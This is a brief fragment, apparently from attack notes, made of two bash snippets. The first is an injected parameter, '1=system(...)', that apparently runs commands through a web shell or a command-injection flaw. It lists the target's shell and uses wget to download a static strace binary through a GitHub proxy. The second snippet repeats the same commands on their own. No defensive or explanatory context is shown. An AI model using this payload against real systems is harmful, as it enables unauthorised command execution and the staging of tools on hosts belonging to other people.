...
```bash
1=system('ls -alh $(which sh);wget "https://gh-proxy.org/https://github.com/XMCVE/static-tools/blob/main/strace/strace.x86_64.6.4";
...
```bash
ls -alh $(which sh);
wget "https://gh-proxy.org/https://github.com/XMCVE/static-tools/blob/main/strace/strace.x86_64.6.4";
